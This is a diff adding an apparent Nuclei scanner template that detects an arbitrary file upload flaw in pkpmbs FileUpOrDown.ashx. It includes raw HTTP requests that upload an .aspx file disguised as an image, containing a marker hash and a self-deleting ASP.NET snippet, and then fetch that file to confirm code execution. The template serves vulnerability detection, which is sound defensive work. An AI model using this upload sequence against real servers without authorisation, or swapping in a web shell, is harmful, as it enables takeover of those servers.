@@ -1,0 +1,66 @@
+id: pkpmbs-file-upload
+
+info:
+  name: pkpmbs FileUpOrDown.aspx File Upload
+  author: ProjectDiscoveryAI
+  description: |
+    Pkpmbs FileUpOrDown.aspx has a file upload vulnerability which allows attackers to gain server control privileges.
+    Affected version: 2023-02-15 111309 and below.
+  severity: critical
+  tags: file-upload
+
+variables:
+  filename: "{{rand_text_alphanumeric(6)}}.aspx"
+  filecontent: |
+    e165421110ba03099a1c0393373c5b43
+    <%@ Page Language="C#" Debug="true" %>
+    <%@ import Namespace="System"%>
+    <%@ import Namespace="System.IO"%>
+    <% string pageName = Request.PhysicalPath;%>
+    <% File.Delete(pageName);%>
+
+http:
+  - raw:
+      - |
+        GET /Login.cshtml HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /Applications/Forms/SearchSetting/FileUpOrDown.ashx?operation=Fileupload&extName=.aspx&searchConfigName={{filename}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybqACRhAMBHmQQAUP
+
+        ------WebKitFormBoundarybqACRhAMBHmQQAUP
+        Content-Disposition: form-data; name="Filedata"; filename="{{filename}}"
+        Content-Type: image/png
+
+        {{filecontent}}
+        ------WebKitFormBoundarybqACRhAMBHmQQAUP--
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "1|/Excel/Templete/"
+
+  - raw:
+      - |
+        GET /Excel/Templete/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+    matchers-condition: and
